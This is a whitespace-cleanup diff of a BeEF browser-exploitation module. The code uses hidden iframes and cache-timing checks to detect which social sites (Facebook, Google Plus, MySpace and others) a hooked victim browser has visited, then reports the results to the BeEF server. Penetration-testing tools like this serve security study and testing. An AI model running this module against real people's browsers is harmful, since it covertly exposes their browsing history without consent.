@@ -7,9 +7,9 @@
 
 var hidden_iframe = beef.dom.createInvisibleIframe();
 hidden_iframe.setAttribute('id','f');
-hidden_iframe.setAttribute('name','f');		
-hidden_iframe.setAttribute('src','about:blank');		
-hidden_iframe.setAttribute('style','opacity: 0.1');		
+hidden_iframe.setAttribute('name','f');
+hidden_iframe.setAttribute('src','about:blank');
+hidden_iframe.setAttribute('style','opacity: 0.1');
 
 var results = "";
 var tries = 0;
@@ -47,7 +47,7 @@ if (beef.browser.isFF() == 1) {
 									  'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
 									  'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },
 	  { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },
-	
+
 	  { 'name': 'Dogster', 'urls': [ 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js.gz',
 									 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js' ] },
 	  { 'name': 'MySpace', 'urls': [ 'http://x.myspacecdn.com/modules/common/static/css/futuraglobal_kqj36l0b.css' ] },
@@ -85,7 +85,7 @@ if (beef.browser.isFF() == 1) {
 	 * CONFIGURABLE SETTINGS *
 	 *************************/
 	var TIME_LIMIT = 5;
-	var MAX_ATTEMPTS = 2;	
+	var MAX_ATTEMPTS = 2;
 }
 if (beef.browser.isIE() == 1) {
 	/****************
@@ -128,9 +128,9 @@ if (beef.browser.isIE() == 1) {
 	/*************************
 	 * CONFIGURABLE SETTINGS *
 	 *************************/
-	
-	var TIME_LIMIT = 1; 
-	var MAX_ATTEMPTS = 1;	
+
+	var TIME_LIMIT = 1;
+	var MAX_ATTEMPTS = 1;
 }
 
 if (beef.browser.isO() == 1){
@@ -143,7 +143,7 @@ if (beef.browser.isO() == 1){
 									  'http://static.ak.facebook.com/rsrc.php/v1/yX/r/HN0ehA1zox_.js',
 									  'http://static.ak.fbcdn.net/rsrc.php/v1/yX/r/HN0ehA1zox_.js' ] },
 	  { 'name': 'Google Plus', 'urls': [ 'https://ssl.gstatic.com/gb/js/abc/gcm_57b1882492d4d0138a0a7ea7240394ca.js' ] },
-	
+
 	  { 'name': 'Dogster', 'urls': [ 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js.gz',
 									 'http://a1.cdnsters.com/static/resc/labjs1.2.0-jquery1.6-jqueryui1.8.12-bugfix4758.min.js' ] },
 	  { 'name': 'MySpace', 'urls': [ 'http://x.myspacecdn.com/modules/common/static/css/futuraglobal_kqj36l0b.css' ] },
@@ -181,7 +181,7 @@ if (beef.browser.isO() == 1){
 	 * CONFIGURABLE SETTINGS *
 	 *************************/
 	var TIME_LIMIT = 3;
-	var MAX_ATTEMPTS = 1;	
+	var MAX_ATTEMPTS = 1;
 }
 
 function sched_call(fn) {
@@ -214,7 +214,7 @@ function perform_check() {
   }
   if(beef.browser.isO() == 1){
     setTimeout(wait_for_read, 1);
-  } 
+  }
 }
 
 
@@ -240,13 +240,13 @@ function wait_for_read() {
 		setTimeout(wait_for_read2, 0);
 	  } catch (e) {
 		setTimeout(wait_for_read, 0);
-	  }	
+	  }
    }
    if (beef.browser.isO() == 1){
       try{
-		
+
         if(frames['f'].location.href != 'about:blank') throw 1;
-        
+
         frames['f'].stop();
         document.getElementById('f').src = 'javascript:"<body onload=\'parent.frame_ready = true\'>"';
         setTimeout(wait_for_read2, 1);
@@ -275,7 +275,7 @@ function navigate_to_target() {
   cycles = 0;
   if (beef.browser.isFF() == 1) {
 	  sched_call(wait_for_noread);
-  } 
+  }
   if (beef.browser.isIE() == 1) {
 	  setTimeout(wait_for_noread, 0);
   }
@@ -302,11 +302,11 @@ function wait_for_noread() {
 		if (cycles++ >= TIME_LIMIT) {
 		  maybe_test_next();
 		  return;
-		}		
+		}
 		setTimeout(wait_for_noread, 0);
  	  }
  	if (beef.browser.isFF() == 1) {
-		if (document.getElementById('f').contentWindow.location.href == undefined) 
+		if (document.getElementById('f').contentWindow.location.href == undefined)
 		{
 			confirmed_visited = true;
 			throw 1;
@@ -314,8 +314,8 @@ function wait_for_noread() {
   		if (cycles >= TIME_LIMIT) {
      		maybe_test_next();
       		return;
-    	}	
-    	sched_call(wait_for_noread);    	
+    	}
+    	sched_call(wait_for_noread);
 	}
     if (beef.browser.isO() == 1){
        if (frames['f'].location.href == undefined){
@@ -405,7 +405,7 @@ function start_stuff() {
   }
   else {
   	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'results=This proof-of-concept is specific to Firefox, Internet Explorer, Chrome and Opera, and probably won\'t work for you.');
-  }  
+  }
 }
 
 /**************/
@@ -456,12 +456,12 @@ function visipisiCB(vp, endCB, sites, urls, site, result){
     if(result === null){
 	vp_result[site] = 'Whoops';
      }
-     else{	
+     else{
 	vp_result[site] = result ? 'visited' : 'not visited';
      }
      var next_site = sites.pop();
      if(next_site)
-	vp( urls[next_site], function (result) { 
+	vp( urls[next_site], function (result) {
 	  visipisiCB(vp, endCB, sites, urls, next_site, result);
 	});
       else
@@ -532,15 +532,13 @@ function prepResult(results){
     return result_str;
 }
 
-beef.execute(function() { 
+beef.execute(function() {
   if(beef.browser.isC() == 1){
 	getVisitedDomains();
 
-  } else {  
+  } else {
    urls = undefined;
    exec_next = null;
    start_stuff();
  }
 });
-
-	
